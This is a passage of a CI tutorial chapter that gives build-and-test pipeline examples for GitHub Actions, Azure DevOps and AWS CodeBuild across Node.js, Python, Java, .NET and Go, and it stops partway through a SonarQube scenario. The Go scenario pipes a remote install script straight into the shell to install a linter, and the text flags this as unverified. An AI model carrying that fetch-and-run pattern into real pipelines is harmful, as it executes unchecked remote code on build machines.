# 01 — CI: Build & Test Scenarios (Scenarios 4–15)

[⬅️ Back to Index](README.md) · [⬅️ Previous: Fundamentals](00-fundamentals.md)

---

> **CI (Continuous Integration)** = every push and every pull request gets built and tested
> automatically. This chapter covers the CI pipelines you'll write most often. If a
> language's tooling is unfamiliar, the
> [Dockerfile Handbook](../docker/dockerfile_handbook/README.md) explains each stack in plain
> English.

## Table of Contents

| # | Scenario | Key skills |
|---|----------|-----------|
| 4 | [Node.js CI: lint → test → build, with caching & test reports](#scenario-4--nodejs-ci) | Caching, JUnit reports |
| 5 | [Python CI across several Python versions (matrix)](#scenario-5--python-ci-with-a-version-matrix) | Matrix / batch builds |
| 6 | [Java (Maven) CI with test reports & coverage](#scenario-6--java-maven-ci-with-test-reports-and-coverage) | JaCoCo, surefire |
| 7 | [.NET CI with test results & code coverage](#scenario-7--net-ci-with-test-results-and-coverage) | `dotnet test`, Cobertura |
| 8 | [Go CI with linting & race detection](#scenario-8--go-ci-with-linting-and-race-detection) | golangci-lint |
| 9 | [Cross-platform matrix (Linux / Windows / macOS)](#scenario-9--cross-platform-matrix) | OS matrix, `fail-fast` |
| 10 | [Integration tests with a real database](#scenario-10--integration-tests-with-a-real-database) | Service containers |
| 11 | [Monorepo: build only what changed](#scenario-11--monorepo-build-only-what-changed) | Path filters |
| 12 | [Build once, test in parallel, package](#scenario-12--build-once-test-in-parallel-package) | Artifacts between jobs |
| 13 | [Code-quality gate with SonarQube / SonarCloud](#scenario-13--code-quality-gate-with-sonarqube) | Quality gates |
| 14 | [PR validation & branch protection](#scenario-14--pr-validation-and-branch-protection) | Required checks, PR comments |
| 15 | [Making slow pipelines fast: caching + test sharding](#scenario-15--making-slow-pipelines-fast) | Cache keys, sharding |

---

## Scenario 4 — Node.js CI

**🎯 Goal:** On every push/PR, install dependencies (cached), run the linter and the unit
tests, publish the test results so they're visible in the UI, and build the app.

**📁 Repo has:** `package.json` with scripts `lint`, `test`, `build`, plus `package-lock.json`.
Tests output a JUnit XML report (`junit.xml`, via the `jest-junit` package).

### GitHub Actions — `.github/workflows/ci.yml`

```yaml
name: CI
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read
  checks: write              # needed by the test-reporter action to create a check

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15      # kill hung jobs instead of burning 6 hours
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm         # caches ~/.npm keyed on package-lock.json

      - run: npm ci
      - run: npm run lint
      - run: npm test -- --ci --reporters=default --reporters=jest-junit

      - name: Publish test results
        if: ${{ !cancelled() }}          # publish even when tests fail
        uses: dorny/test-reporter@v1
        with:
          name: Jest tests
          path: junit.xml
          reporter: jest-junit

      - run: npm run build

      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/
          retention-days: 7
```

### Azure DevOps — `azure-pipelines.yml`

```yaml
trigger:
  branches: { include: [main] }
pr:
  branches: { include: [main] }

pool:
  vmImage: ubuntu-latest

variables:
  npm_config_cache: $(Pipeline.Workspace)/.npm    # tell npm where its cache lives

steps:
  - task: UseNode@1
    inputs:
      version: '22.x'

  - task: Cache@2
    displayName: Cache npm
    inputs:
      key: 'npm | "$(Agent.OS)" | package-lock.json'
      restoreKeys: |
        npm | "$(Agent.OS)"
      path: $(npm_config_cache)

  - script: npm ci
    displayName: Install
  - script: npm run lint
    displayName: Lint
  - script: npm test -- --ci --reporters=default --reporters=jest-junit
    displayName: Unit tests

  - task: PublishTestResults@2
    condition: succeededOrFailed()                 # publish even if tests failed
    inputs:
      testResultsFormat: JUnit
      testResultsFiles: '**/junit.xml'
      failTaskOnFailedTests: true

  - script: npm run build
    displayName: Build

  - publish: dist                                  # shorthand for PublishPipelineArtifact
    artifact: dist
```

### AWS CodeBuild — `buildspec.yml`

```yaml
version: 0.2

phases:
  install:
    runtime-versions:
      nodejs: 20
    commands:
      - npm ci
  build:
    commands:
      - npm run lint
      - npm test -- --ci --reporters=default --reporters=jest-junit
      - npm run build

reports:
  jest-reports:
    files: ["junit.xml"]
    file-format: JUNITXML

artifacts:
  base-directory: dist
  files: ["**/*"]

cache:
  paths:
    - "/root/.npm/**/*"
```

**🔍 Explained:**

- **`npm ci`** installs exactly what's in the lock file. Never use `npm install` in CI.
- **Caching:**
  - GitHub's `setup-node` with `cache: npm` handles it in one line.
  - Azure DevOps uses `Cache@2`. The cache **key** includes a hash of `package-lock.json`, so
    a changed lock file means a new cache. `restoreKeys` falls back to the latest older cache.
  - CodeBuild's `cache: paths` only works if the **project** has caching enabled (S3 or local).
- **Test reports:** each platform displays JUnit XML differently (a check run, the "Tests"
  tab, or a "Reports" group). The format is the same everywhere: **JUnit XML** is the universal
  test-report format.
- **`if: ${{ !cancelled() }}` / `condition: succeededOrFailed()`:** by default, later steps
  are **skipped** after a failure. Reports must run anyway, or you won't see *which* test failed.

**⚠️ Gotchas:**

- **CodeBuild `runtime-versions`** must be supported by the chosen **image**. Asking for
  `nodejs: 22` on an image that only has 18/20 fails with `Unknown runtime version`.
  Check the "available runtimes" table for your image (`aws/codebuild/standard:7.0`, etc.).
- **Don't cache `node_modules/`** — it's OS- and Node-version-specific. Cache the npm download
  cache (`~/.npm`) and let `npm ci` rebuild `node_modules`.
- **Set `timeout-minutes` (GitHub) / `timeoutInMinutes` (ADO).** GitHub's default is
  **360 minutes**. A hung test can waste six hours of paid minutes.

---

## Scenario 5 — Python CI with a version matrix

**🎯 Goal:** The library must support Python 3.10, 3.11 and 3.12. Run the tests on **all three
in parallel**, and collect coverage from one of them.

### GitHub Actions

```yaml
name: Python CI
on: [push, pull_request]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false                 # let all versions finish, even if one fails
      matrix:
        python-version: ["3.10", "3.11", "3.12"]   # QUOTED — 3.10 would become 3.1!
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
          cache: pip
          cache-dependency-path: requirements*.txt
      - run: pip install -r requirements.txt -r requirements-dev.txt
      - run: ruff check .                                   # fast linter
      - run: pytest --junitxml=test-results.xml --cov=src --cov-report=xml
      - uses: actions/upload-artifact@v4
        if: ${{ !cancelled() }}
        with:
          name: test-results-${{ matrix.python-version }}   # unique name per matrix leg
          path: |
            test-results.xml
            coverage.xml
```

### Azure DevOps

```yaml
trigger: [main]
pool:
  vmImage: ubuntu-latest

strategy:
  matrix:
    Python310: { pythonVersion: '3.10' }
    Python311: { pythonVersion: '3.11' }
    Python312: { pythonVersion: '3.12' }
  maxParallel: 3

steps:
  - task: UsePythonVersion@0
    inputs:
      versionSpec: $(pythonVersion)

  - script: |
      python -m pip install --upgrade pip
      pip install -r requirements.txt -r requirements-dev.txt
    displayName: Install

  - script: |
      ruff check .
      pytest --junitxml=test-results.xml --cov=src --cov-report=xml
    displayName: Lint & test

  - task: PublishTestResults@2
    condition: succeededOrFailed()
    inputs:
      testResultsFiles: test-results.xml
      testRunTitle: 'Python $(pythonVersion)'

  - task: PublishCodeCoverageResults@2
    condition: and(succeededOrFailed(), eq(variables['pythonVersion'], '3.12'))
    inputs:
      summaryFileLocation: coverage.xml
```

### AWS CodeBuild — batch build matrix

```yaml
version: 0.2

batch:
  fast-fail: false
  build-matrix:
    dynamic:
      env:
        variables:
          PY_VERSION:
            - "3.10"
            - "3.11"
            - "3.12"

phases:
  install:
    commands:
      # Use pyenv (preinstalled on standard images) to select the matrix version
      - pyenv install -s $PY_VERSION
      - pyenv global $PY_VERSION
      - python --version
      - pip install -r requirements.txt -r requirements-dev.txt
  build:
    commands:
      - ruff check .
      - pytest --junitxml=test-results.xml --cov=src --cov-report=xml

reports:
  pytest:
    files: ["test-results.xml"]
    file-format: JUNITXML
  coverage:
    files: ["coverage.xml"]
    file-format: COBERTURAXML
```

**🔍 Explained:**

- A **matrix** turns one job definition into N parallel jobs, one per combination.
- **`fail-fast: false`:** by default, GitHub cancels the remaining legs as soon as one fails.
  With this set, you see the full picture ("fails only on 3.10").
- **CodeBuild batch builds** need **batch builds enabled** on the project (plus a batch
  service role). They start one build per matrix value.
- **CodeBuild `reports:`** also accept coverage formats (`COBERTURAXML`, `JACOCOXML`, …).

**⚠️ Gotchas:**

- **Quote version numbers.** `3.10` unquoted is the float `3.1`, so the job installs Python 3.1
  (or fails). This bites everyone once.
- **Artifact names must be unique per matrix leg** (`upload-artifact@v4` refuses duplicates).
- **Matrix size multiplies cost.** 3 Python versions × 3 OSes × 2 DBs = 18 jobs per push.
  Run the full matrix nightly and a small one on PRs.

---

## Scenario 6 — Java (Maven) CI with test reports and coverage

**🎯 Goal:** Build a Spring Boot service with Maven, publish the JUnit (Surefire) results and
JaCoCo coverage, and keep the `.jar`.

### GitHub Actions

```yaml
name: Java CI
on: [push, pull_request]

permissions:
  contents: read
  checks: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "21"
          cache: maven                    # caches ~/.m2/repository keyed on pom.xml files
      - name: Build & test
        run: mvn -B verify                # compile → test → package → jacoco report (if configured)
      - uses: dorny/test-reporter@v1
        if: ${{ !cancelled() }}
        with:
          name: Maven tests
          path: target/surefire-reports/*.xml
          reporter: java-junit
      - uses: actions/upload-artifact@v4
        with:
          name: app-jar
          path: target/*.jar
```

### Azure DevOps

```yaml
trigger: [main]
pool:
  vmImage: ubuntu-latest

variables:
  MAVEN_CACHE_FOLDER: $(Pipeline.Workspace)/.m2/repository
  MAVEN_OPTS: '-Dmaven.repo.local=$(MAVEN_CACHE_FOLDER)'

steps:
  - task: Cache@2
    inputs:
      key: 'maven | "$(Agent.OS)" | **/pom.xml'
      restoreKeys: |
        maven | "$(Agent.OS)"
      path: $(MAVEN_CACHE_FOLDER)

  - task: Maven@4
    inputs:
      mavenPomFile: pom.xml
      goals: verify
      options: '-B $(MAVEN_OPTS)'
      javaHomeOption: JDKVersion
      jdkVersionOption: '1.21'
      publishJUnitResults: true                       # built-in test publishing
      testResultsFiles: '**/surefire-reports/TEST-*.xml'

  - task: PublishCodeCoverageResults@2
    inputs:
      summaryFileLocation: '$(System.DefaultWorkingDirectory)/target/site/jacoco/jacoco.xml'

  - task: CopyFiles@2
    inputs:
      contents: 'target/*.jar'
      targetFolder: $(Build.ArtifactStagingDirectory)
      flattenFolders: true

  - publish: $(Build.ArtifactStagingDirectory)
    artifact: app-jar
```

### AWS CodeBuild

```yaml
version: 0.2

phases:
  install:
    runtime-versions:
      java: corretto21
  build:
    commands:
      - mvn -B verify

reports:
  surefire:
    files: ["**/*.xml"]
    base-directory: target/surefire-reports
    file-format: JUNITXML
  jacoco:
    files: ["jacoco.xml"]
    base-directory: target/site/jacoco
    file-format: JACOCOXML

artifacts:
  files: ["target/*.jar"]
  discard-paths: yes          # put the jar at the artifact root (no target/ folder)

cache:
  paths:
    - "/root/.m2/**/*"
```

**🔍 Explained:**

- **`mvn -B verify`** runs the full lifecycle up to integration checks. `-B` means batch mode
  (no colour codes or prompts in the logs).
- **JaCoCo** coverage only appears if the developers configured the `jacoco-maven-plugin` in
  `pom.xml`. The pipeline can't invent it.
- **`discard-paths: yes`** flattens the folder structure in the artifact zip.

**⚠️ Gotchas:**

- **Maven Central rate-limits and blocks heavy anonymous traffic.** Large orgs use an internal
  proxy (Azure Artifacts, CodeArtifact, Nexus, Artifactory) via `settings.xml` mirrors.
- **`Maven@4`'s `jdkVersionOption` uses `1.21`-style values** for the preinstalled JDKs. If
  the agent image lacks that JDK, use the `JavaToolInstaller@0` task first.

---

## Scenario 7 — .NET CI with test results and coverage

**🎯 Goal:** Restore, build and test a .NET solution, then publish TRX test results and
Cobertura coverage.

### GitHub Actions

```yaml
name: .NET CI
on: [push, pull_request]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      DOTNET_NOLOGO: true
      DOTNET_CLI_TELEMETRY_OPTOUT: true
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: "8.0.x"
          cache: true                                  # requires packages.lock.json files
          cache-dependency-path: "**/packages.lock.json"
      - run: dotnet restore --locked-mode
      - run: dotnet build --no-restore -c Release
      - run: >
          dotnet test --no-build -c Release
          --logger "trx;LogFileName=test-results.trx"
          --collect:"XPlat Code Coverage"
          --results-directory ./TestResults
      - uses: actions/upload-artifact@v4
        if: ${{ !cancelled() }}
        with:
          name: test-results
          path: TestResults/
```

### Azure DevOps

```yaml
trigger: [main]
pool:
  vmImage: ubuntu-latest

variables:
  buildConfiguration: Release

steps:
  - task: UseDotNet@2
    inputs:
      packageType: sdk
      version: '8.0.x'

  - task: DotNetCoreCLI@2
    displayName: Restore
    inputs:
      command: restore
      projects: '**/*.sln'

  - task: DotNetCoreCLI@2
    displayName: Build
    inputs:
      command: build
      projects: '**/*.sln'
      arguments: '--no-restore -c $(buildConfiguration)'

  - task: DotNetCoreCLI@2
    displayName: Test
    inputs:
      command: test
      projects: '**/*Tests.csproj'
      arguments: '--no-build -c $(buildConfiguration) --collect:"XPlat Code Coverage"'
      publishTestResults: true          # TRX results go to the Tests tab automatically

  - task: PublishCodeCoverageResults@2
    inputs:
      summaryFileLocation: '$(Agent.TempDirectory)/**/coverage.cobertura.xml'
```

### AWS CodeBuild

```yaml
version: 0.2

env:
  variables:
    DOTNET_CLI_TELEMETRY_OPTOUT: "true"

phases:
  install:
    runtime-versions:
      dotnet: 8.0
  build:
    commands:
      - dotnet restore
      - dotnet build --no-restore -c Release
      - >
        dotnet test --no-build -c Release
        --logger "trx;LogFileName=test-results.trx"
        --collect:"XPlat Code Coverage"
        --results-directory ./TestResults

reports:
  dotnet-tests:
    files: ["**/*.trx"]
    base-directory: TestResults
    file-format: VISUALSTUDIOTRX
  dotnet-coverage:
    files: ["**/coverage.cobertura.xml"]
    base-directory: TestResults
    file-format: COBERTURAXML
```

**🔍 Explained:**

- **`--collect:"XPlat Code Coverage"`** uses the **coverlet** collector (the
  `coverlet.collector` package in test projects) and writes `coverage.cobertura.xml`.
- **`publishTestResults: true`** on `DotNetCoreCLI@2 test` adds the TRX logger and publishes
  the results for you.
- **`--locked-mode`** fails if `packages.lock.json` doesn't match (the .NET equivalent of `npm ci`).

**⚠️ Gotchas:**

- **ADO coverage path:** with `publishTestResults: true`, test output goes to
  `$(Agent.TempDirectory)`. That's why the coverage path points there, not to the repo.
- **Private NuGet feeds** need the `NuGetAuthenticate@1` task (ADO) or a `nuget.config` with
  credentials from secrets. See [Chapter 05](05-devsecops.md).

---

## Scenario 8 — Go CI with linting and race detection

### GitHub Actions

```yaml
name: Go CI
on: [push, pull_request]

permissions:
  contents: read

jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version-file: go.mod           # use the version declared in go.mod
          # module + build cache is enabled by default (keyed on go.sum)
      - name: Lint
        uses: golangci/golangci-lint-action@v6
        with:
          version: v1.61
      - run: go vet ./...
      - run: go test -race -coverprofile=coverage.out ./...
      - run: go build -trimpath -o bin/app ./cmd/app
```

### Azure DevOps

```yaml
trigger: [main]
pool:
  vmImage: ubuntu-latest

variables:
  GOPATH: $(Pipeline.Workspace)/go
  GOCACHE: $(Pipeline.Workspace)/.cache/go-build

steps:
  - task: GoTool@0
    inputs:
      version: '1.23.2'

  - task: Cache@2
    inputs:
      key: 'go | "$(Agent.OS)" | go.sum'
      path: $(GOPATH)/pkg/mod

  - script: |
      curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh \
        | sh -s -- -b $(go env GOPATH)/bin v1.61.0
      $(go env GOPATH)/bin/golangci-lint run ./...
    displayName: Lint

  - script: |
      go vet ./...
      go test -race -coverprofile=coverage.out ./...
      go build -trimpath -o bin/app ./cmd/app
    displayName: Vet, test, build
```

### AWS CodeBuild

```yaml
version: 0.2

phases:
  install:
    runtime-versions:
      golang: 1.22
    commands:
      - curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sh -s -- -b /usr/local/bin v1.61.0
  build:
    commands:
      - golangci-lint run ./...
      - go vet ./...
      - go test -race -coverprofile=coverage.out ./...
      - go build -trimpath -o bin/app ./cmd/app

artifacts:
  files: ["bin/app"]

cache:
  paths:
    - "/go/pkg/mod/**/*"
    - "/root/.cache/go-build/**/*"
```

**🔍 Explained:**

- **`-race`** turns on Go's data-race detector. It catches concurrency bugs that happen
  randomly in production. It needs cgo (fine on standard runners).
- **`go-version-file: go.mod`** means the version comes from the code, so CI and developer
  laptops can't drift apart.

**⚠️ Gotchas:**

- **Pin the linter version.** New golangci-lint releases add checks, and an unpinned linter
  can break the build on a day nobody changed any code.
- **`curl ... | sh`** runs an unverified script. It's acceptable for well-known tools pinned
  to a version, but a pre-built tools image or checksum-verified download is safer.

---

## Scenario 9 — Cross-platform matrix

**🎯 Goal:** A CLI tool must work on **Linux, Windows and macOS** with two Node versions.

### GitHub Actions

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [20, 22]
        exclude:
          - os: macos-latest      # skip one combination to save money
            node: 20
        include:
          - os: ubuntu-latest     # add an extra variable to one combination
            node: 22
            coverage: true
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm test
        shell: bash                # same shell on every OS (Windows default is PowerShell)
      - if: ${{ matrix.coverage }}
        run: npm run coverage
```

### Azure DevOps

```yaml
strategy:
  matrix:
    linux_node22:
      imageName: ubuntu-latest
      nodeVersion: '22.x'
    windows_node22:
      imageName: windows-latest
      nodeVersion: '22.x'
    mac_node22:
      imageName: macOS-latest
      nodeVersion: '22.x'

pool:
  vmImage: $(imageName)

steps:
  - task: UseNode@1
    inputs:
      version: $(nodeVersion)
  - bash: |
      npm ci
      npm test
    displayName: Install & test
```

### AWS CodeBuild

CodeBuild supports Linux and Windows containers, plus macOS on dedicated "reserved capacity"
fleets. Windows/macOS are usually set up as **separate projects** (different environment
type). Within Linux, a batch matrix can vary the build image, for example Ubuntu-based vs
Amazon Linux-based:

```yaml
version: 0.2
batch:
  build-matrix:
    dynamic:
      env:
        image:
          - aws/codebuild/standard:7.0
          - aws/codebuild/amazonlinux2-x86_64-standard:5.0
phases:
  install:
    runtime-versions:
      nodejs: 20
  build:
    commands:
      - npm ci
      - npm test
```

**🔍 Explained:**

- **`exclude` / `include`** fine-tune the combinations. `include` can also add variables that
  only exist in specific legs.
- **`shell: bash`** on Windows uses Git Bash, so the same script syntax works on every OS.

**⚠️ Gotchas:**

- **macOS runners cost about 10× Linux minutes** on GitHub (private repos), and Windows about 2×.
  Use them only where you have to.
- **Windows path separators, line endings (CRLF) and case-insensitive filenames** are the
  usual reasons tests "only fail on Windows".

---

## Scenario 10 — Integration tests with a real database

**🎯 Goal:** Tests need a real **PostgreSQL** and **Redis** — not mocks.

### GitHub Actions — service containers

```yaml
jobs:
  integration:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
          POSTGRES_DB: app_test
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U test"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10
      redis:
        image: redis:7
        ports: ["6379:6379"]
        options: --health-cmd "redis-cli ping" --health-interval 5s --health-retries 10
    env:
      DATABASE_URL: postgresql://test:test@localhost:5432/app_test
      REDIS_URL: redis://localhost:6379/0
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npm run db:migrate
      - run: npm run test:integration
```

### Azure DevOps — service containers

```yaml
resources:
  containers:
    - container: pg
      image: postgres:16
      env:
        POSTGRES_USER: test
        POSTGRES_PASSWORD: test
        POSTGRES_DB: app_test
      ports: ["5432:5432"]
    - container: redis
      image: redis:7
      ports: ["6379:6379"]

pool:
  vmImage: ubuntu-latest

services:
  postgres: pg
  redis: redis

variables:
  DATABASE_URL: postgresql://test:test@localhost:5432/app_test
  REDIS_URL: redis://localhost:6379/0

steps:
  - script: |
      # Wait until Postgres accepts connections (ADO has no built-in health wait)
      for i in $(seq 1 30); do pg_isready -h localhost -U test && break; sleep 2; done
    displayName: Wait for Postgres
  - script: npm ci && npm run db:migrate && npm run test:integration
    displayName: Integration tests
```

### AWS CodeBuild — Docker Compose (project must use **privileged mode**)

```yaml
version: 0.2

phases:
  pre_build:
    commands:
      - docker compose -f docker-compose.test.yml up -d --wait   # --wait = until healthchecks pass
  build:
    commands:
      - export DATABASE_URL=postgresql://test:test@localhost:5432/app_test
      - export REDIS_URL=redis://localhost:6379/0
      - npm ci
      - npm run db:migrate
      - npm run test:integration
    finally:
      - docker compose -f docker-compose.test.yml logs --no-color > compose.log || true
      - docker compose -f docker-compose.test.yml down -v
```

**🔍 Explained:**

- **Service containers** run next to the job. Because the job itself runs on the VM, the
  services are reachable at `localhost:<port>` through the port mappings.
- **GitHub's `--health-*` options** make the job wait until the database is healthy.
- **CodeBuild has no service containers.** Use Docker (privileged mode on) and Compose's
  `--wait`. `finally:` runs whether tests pass or fail, which is the place for cleanup and
  collecting logs.

**⚠️ Gotchas:**

- **Hostname depends on where the job runs:**
  - Job on the VM (the examples above): use **`localhost`**.
  - Job inside a container (`container:` in GitHub, `container:` target in ADO): use the
    **service name** (`postgres`).
  Mixing these up gives "connection refused".
- **Pulling from Docker Hub in CI hits rate limits.** Anonymous pulls are limited; log in
  first, or mirror images into your own registry (ACR/ECR/GHCR).

---

## Scenario 11 — Monorepo: build only what changed

**🎯 Goal:** The repo contains `services/api`, `services/web` and `libs/shared`. A change to
`services/web/**` shouldn't rebuild `api`. A change in `libs/shared/**` should rebuild both.

### GitHub Actions — dynamic detection with `dorny/paths-filter`

```yaml
name: Monorepo CI
on: [push, pull_request]

permissions:
  contents: read
  pull-requests: read

jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api:
              - 'services/api/**'
              - 'libs/shared/**'
            web:
              - 'services/web/**'
              - 'libs/shared/**'

  api:
    needs: changes
    if: needs.changes.outputs.api == 'true'
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: services/api
    steps:
      - uses: actions/checkout@v4
      - run: make test build

  web:
    needs: changes
    if: needs.changes.outputs.web == 'true'
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: services/web
    steps:
      - uses: actions/checkout@v4
      - run: make test build

  # ONE stable job to mark as "required" in branch protection
  ci-ok:
    if: always()
    needs: [api, web]
    runs-on: ubuntu-latest
    steps:
      - name: Fail if any needed job failed
        if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
        run: exit 1
      - run: echo "All required jobs passed or were skipped"
```

### Azure DevOps — one pipeline per service with path triggers

`services/api/azure-pipelines.yml`:

```yaml
trigger:
  branches:
    include: [main]
  paths:
    include:
      - services/api/*
      - libs/shared/*

pool:
  vmImage: ubuntu-latest

steps:
  - script: make test build
    workingDirectory: services/api
```

`services/web/azure-pipelines.yml` is the same with `services/web/*`. Register each file as
its own pipeline. For PRs in Azure Repos, add a **build validation policy per pipeline**
with a **path filter** (`/services/api/*; /libs/shared/*`).

### AWS CodeBuild — one project per service with `FILE_PATH` filters

```yaml
ApiBuild:
  Type: AWS::CodeBuild::Project
  Properties:
    Source:
      Type: GITHUB
      Location: https://github.com/acme/monorepo.git
      BuildSpec: services/api/buildspec.yml     # per-service buildspec path
    Triggers:
      Webhook: true
      FilterGroups:
        - - Type: EVENT
            Pattern: PUSH,PULL_REQUEST_CREATED,PULL_REQUEST_UPDATED
          - Type: FILE_PATH
            Pattern: ^(services/api/|libs/shared/).*
```

**🔍 Explained:**

- **`dorny/paths-filter`** compares the changed files against glob patterns and outputs
  `true`/`false` per group. Jobs then run conditionally.
- **The `ci-ok` aggregator job** solves the "required check never reports" problem. Branch
  protection requires **only** `ci-ok`, which always runs, and fails if any real job failed.
- **Separate pipelines/projects per service** is the simplest model on ADO and AWS.

**⚠️ Gotchas:**

- **Path filters compare against different bases** on push vs PR events (previous commit vs
  PR base branch). Force-pushes and new branches can make "what changed" surprising. When in
  doubt, build everything on `main`.
- **Shared libraries are the trap.** Forget `libs/shared/**` in one filter and a breaking
  change to the library merges without that service being tested.
- **For big monorepos**, build tools like **Nx**, **Turborepo**, **Bazel** or **Pants**
  calculate affected projects from the real dependency graph. That's more accurate than path globs.

---

## Scenario 12 — Build once, test in parallel, package

**🎯 Goal:** Compile once, then run **unit**, **e2e** and **security** checks in parallel jobs
that all use the **same build output**. Package it only if everything passes.

```
           ┌─► unit-tests ──┐
 build ────┼─► e2e-tests ───┼──► package
           └─► audit ───────┘
```

### GitHub Actions

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/

  unit-tests:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - uses: actions/download-artifact@v4
        with: { name: build-output, path: dist/ }
      - run: npm run test:unit

  e2e-tests:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci && npx playwright install --with-deps chromium
      - uses: actions/download-artifact@v4
        with: { name: build-output, path: dist/ }
      - run: npm run test:e2e

  audit:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm audit --omit=dev --audit-level=high

  package:
    needs: [unit-tests, e2e-tests, audit]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with: { name: build-output, path: dist/ }
      - run: tar -czf app-${{ github.sha }}.tgz -C dist .
      - uses: actions/upload-artifact@v4
        with:
          name: release-package
          path: app-*.tgz
```

### Azure DevOps

```yaml
stages:
  - stage: Build
    jobs:
      - job: Build
        pool: { vmImage: ubuntu-latest }
        steps:
          - script: npm ci && npm run build
          - publish: dist
            artifact: build-output

  - stage: Verify
    dependsOn: Build
    jobs:                              # jobs in a stage run in PARALLEL
      - job: Unit
        pool: { vmImage: ubuntu-latest }
        steps:
          - download: current          # download artifacts from THIS run
            artifact: build-output
          - script: |
              npm ci
              cp -r $(Pipeline.Workspace)/build-output dist
              npm run test:unit
      - job: E2E
        pool: { vmImage: ubuntu-latest }
        steps:
          - download: current
            artifact: build-output
          - script: |
              npm ci && npx playwright install --with-deps chromium
              cp -r $(Pipeline.Workspace)/build-output dist
              npm run test:e2e
      - job: Audit
        pool: { vmImage: ubuntu-latest }
        steps:
          - script: npm audit --omit=dev --audit-level=high

  - stage: Package
    dependsOn: Verify
    jobs:
      - job: Package
        pool: { vmImage: ubuntu-latest }
        steps:
          - checkout: none
          - download: current
            artifact: build-output
          - script: tar -czf $(Build.ArtifactStagingDirectory)/app-$(Build.SourceVersion).tgz -C $(Pipeline.Workspace)/build-output .
          - publish: $(Build.ArtifactStagingDirectory)
            artifact: release-package
```

### AWS CodeBuild — batch `build-graph`

```yaml
version: 0.2

batch:
  fast-fail: true
  build-graph:
    - identifier: build
      buildspec: ci/build.yml
    - identifier: unit
      buildspec: ci/unit.yml
      depend-on: [build]
    - identifier: e2e
      buildspec: ci/e2e.yml
      depend-on: [build]
    - identifier: audit
      buildspec: ci/audit.yml
      depend-on: [build]
    - identifier: package
      buildspec: ci/package.yml
      depend-on: [unit, e2e, audit]
```

Builds inside a batch **don't hand files to each other automatically**. Each one starts from
the source. A common pattern is to upload the build output to S3 keyed by commit, and
download it in the dependent builds:

`ci/build.yml`:

```yaml
version: 0.2
phases:
  build:
    commands:
      - npm ci && npm run build
      - aws s3 sync dist "s3://acme-ci-artifacts/orders-web/${CODEBUILD_RESOLVED_SOURCE_VERSION}/dist"
```

`ci/unit.yml`:

```yaml
version: 0.2
phases:
  build:
    commands:
      - aws s3 sync "s3://acme-ci-artifacts/orders-web/${CODEBUILD_RESOLVED_SOURCE_VERSION}/dist" dist
      - npm ci && npm run test:unit
```

In **CodePipeline**, artifact hand-off is built in. Parallel actions share a `runOrder` and
consume the Build action's **output artifact** as their input, so no manual S3 copying is needed.
For multi-step flows on AWS, CodePipeline is usually the cleaner choice.

**🔍 Explained:**

- **Artifacts** are the hand-off between machines. Each job starts clean (see Chapter 00).
- **`download: current`** (ADO) fetches artifacts from the current run. Files land in
  `$(Pipeline.Workspace)/<artifact name>`.
- **`checkout: none`** skips the repo checkout when a job only needs artifacts. It's faster.

**⚠️ Gotchas:**

- **Upload/download takes time.** For small, fast builds, rebuilding in each job can beat
  shipping artifacts around. Measure before optimising.
- **`upload-artifact@v4` artifacts are immutable.** Uploading the same name twice in one run
  fails. Use unique names or `overwrite: true`.

---

## Scenario 13 — Code-quality gate with SonarQube

**🎯 Goal:** Analyse code quality (bugs, code smells, duplication, coverage) on every PR. If
the **quality gate** fails, the PR can't merge.

### GitHub Actions (SonarQube Server or SonarQube Cloud)

```yaml
jobs:
  sonar:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0            # full history: needed for "new code" & blame
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
